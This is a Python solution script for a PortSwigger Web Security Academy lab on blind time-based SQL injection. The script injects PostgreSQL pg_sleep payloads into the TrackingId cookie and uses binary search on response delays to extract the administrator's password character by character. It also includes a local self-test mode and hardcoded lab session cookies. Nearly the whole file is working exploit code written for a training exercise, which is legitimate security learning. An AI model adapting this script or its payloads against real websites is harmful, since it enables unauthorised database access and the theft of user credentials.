"""
My python based solution to the sql injection challenge for Web Security Academy lab
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

it uses binary search to find the password much faster
"""
import requests
from pprint import pprint 
import string
import random
from time import time, sleep
import statistics

alpha_num = string.digits + string.ascii_lowercase # alphanumeric chars used in db sorted in ascending order
len_alpha_num = len(alpha_num)
no_of_requests = 0
MAX_TIME = 5

host = 'https://ac411fe01e1b29eb805e3da7004b0016.web-security-academy.net/' 
cookie_tracking_id = "kzBnAnYwmb2yEX5n" 
cookie_session = "8nQj9VfbpM74pc4TCWYqSqUYMFFnh6mJ"
raw_headers = """
Cache-Control: max-age=0
Sec-Ch-Ua: ";Not A Brand";v="99", "Chromium";v="94"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
"""


def ParseRawHeaders(text):
	header_array = text.split('\n')[1:-1] # splits each separate header into an array
	header_arr = map(lambda x: x.split(': '), header_array)
	header_dict = {key:value for key, value in header_arr}
	print('Header:')
	pprint(header_dict)
	return header_dict

site_headers = ParseRawHeaders(raw_headers)


def GetMiddle(a, b):
	return int((a + b) / 2)

def BinarySearchPassword(start, end, index, CheckPass, debug):
	"""
	Searches the databes for the correct password using the binary search algorithm.
	at the beginning the start index is 0, and the end index is 0. these represent the index of the character currently being searched
	"index" represents the position of the character currently being searched in the password. for example if your on the 4th character and the password is 'asfnbsdfkj' the index will represent char 'n'
	CheckPass is a function used to check if the current char in the passowrd is > than the char at the middle index - the algorithm works based on that result

	as far as I know, binary search is of log(N) complexity...... sooo its prettyyyyyy fast - at least far better than going through all permutations in burp haha
	https://en.wikipedia.org/wiki/Binary_search_algorithm 
	"""
	if debug:
		print(f'index: {index}, end: {end}, start: {start}')
	else:
		print(LooksCool(start,end))

	middle = GetMiddle(start, end)

	# case 1 - when there are only 2 items e.g [ 'a', 'b']
	if end - start == 1:
		if CheckPass(index, middle, debug) : # we would could use "start" instead here, but middle == start in this case anyways
			return end
		else:
			return start
	# case 2 - if the two indexes are the same, they are the answer
	if end == start:
		return start
	
	if CheckPass(index, middle, debug):
		# if the middle char > than the last, make the start char the index of middle char + 1
		return BinarySearchPassword(middle + 1, end, index, CheckPass, debug)
	else:
		# if the middle char not >, make the last char the middle char
		return BinarySearchPassword(start, middle, index, CheckPass, debug)

def rand():
	tracking_id = "KhDHOI16M6HoEjZH'%3b%20SELECT%20pg_sleep(10)--"
	site_cookies = {'TrackingId': tracking_id, 'session': cookie_session}
	response = requests.get(host, headers=site_headers, cookies=site_cookies)

	pprint(site_cookies)
	diff = response.elapsed.total_seconds()
	print(diff)


def CheckPass(pass_index, search_index, debug):
	"""
	 CheckPass returns true is the server takes up to {MAX_TIME} seconds
	"""
	global no_of_requests
	no_of_requests += 1

	if debug:
		print(f"..CheckPass at index {pass_index} > {alpha_num[search_index]} ?..")

	# inject the sql query into the tracking id. The sql query goes something like this ==> tracking-id='3af.....xyx'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, 1, 1) > 'h') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
	# this should give and error on the server if the condition is true
	tracking_id = cookie_tracking_id + f"'%3b SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, {pass_index}, 1) > '{alpha_num[search_index]}') THEN pg_sleep({MAX_TIME}) ELSE pg_sleep(0) END FROM users--"
	site_cookies = {'TrackingId': tracking_id, 'session': cookie_session}

	if pass_index == 1 and search_index == 0:
		print(f'\nCookies: {site_cookies}\n')

	response = requests.get(host, headers=site_headers, cookies=site_cookies)

	diff = response.elapsed.total_seconds()
	status_code = response.status_code

	# if debug:
	print('Time ==>', diff)

	if diff > (0.7 * MAX_TIME ) :
		if debug:
			print('true')
		return True

	elif status_code == 200 :
		if debug:
			print('false')
		return False
	
	else:
		print(response.text)
		print(response.headers)
		print()
		raise 'Unexpected server error'

def LooksCool(start, end):
	def val(start, end, item, arr):
		index = arr.index(item)

		if start <= index and end >= index:
			return item
		else :
			return '-'
	
	def middstr():
		return ''.join(map(lambda x: '|' + val(start, end, x, alpha_num), alpha_num))
	
	def borderstr():
		midd = GetMiddle(start, end)
		return ''.join(map(lambda x:'=|'if  alpha_num.index(x) == midd else '==', alpha_num))

	string = f"""
	{borderstr()}
	{middstr()}
	{borderstr()}
	"""
	# return middstr()
	# return borderstr()
	return string
	


def Test(debug=True):
	len_test_pass = 28
	test_password =''.join(random.choices(alpha_num, k=len_test_pass))
	solved_password = ''

	def TestCheckPass(pass_index, search_index, debug):
		if debug:
			print(f"..CheckPass: {test_password[pass_index]} > {alpha_num[search_index]}..")
		if test_password[pass_index] > alpha_num[search_index]:
			if debug:
				print('true')
			return True
		else:
			if debug:
				print('false')
			return False

	print('Starting test...')
	print(f'The real password is {test_password}...')
	print(f'alphanum: {alpha_num}, len_alpha: {len_alpha_num}')

	Solve(range(len_test_pass), solved_password, TestCheckPass, test_password, debug)

def FindAvgResponseTime():
	times = []

	site_cookies = {'TrackingId': cookie_tracking_id, 'session': cookie_session}
	for i in range(10):
		start = time()
		response = requests.get(host, headers=site_headers, cookies=site_cookies)
		end = time()
		print(response.status_code)
		times.append(end - start)

	average = statistics.mean(times)
	mode = statistics.mode(times)
	stdev = statistics.stdev(times)
	print(f'average: {average}, mode: {mode}, stdev: {stdev}')

	return average


def Solve(password_arr, solved_password, CheckPass, test_password='', debug=False):
	ll = len(password_arr)
	# for i in range(len_password):
	for i in password_arr:
		print(f'Solving at index {i}.....')

		start = 0
		end = len_alpha_num - 1

		pass_char_at_index = BinarySearchPassword(start, end, i, CheckPass, debug)

		print(f'Solved char index: {pass_char_at_index} ==> {alpha_num[pass_char_at_index]}\n')
		solved_password += alpha_num[pass_char_at_index]

	print(f'Finished...')
	print(f'made {no_of_requests} requests to server out of the possible 720')
	print('Solved Password'.ljust(ll, '_') + '|| ' + 'Real Password'.ljust(ll, '_'))
	print(f'{solved_password}'.ljust(ll) + '|| ' + f'{test_password}'.ljust(ll))
	if test_password:
		print(f'Solved?? {solved_password == test_password}')

def Main():
	len_pass = 20 # i determined this manually with another SQL injection
	solved_password = ''
	db_index_arr = range(1,21)

	print('Starting...')
	print('Testing connection..')
	# avg_time = FindAvgResponseTime()  
	# print(f'Connection average time {avg_time}' )
	print(f'alphanumeric set: {alpha_num}\nNo. of possible chars: {len_alpha_num}\nPassword length: {len_pass}\n')

	Solve(db_index_arr, solved_password, CheckPass, '', False)


if __name__ == "__main__":
	Main()
	# rand()
	# FindAvgResponseTime()
	# Test(False)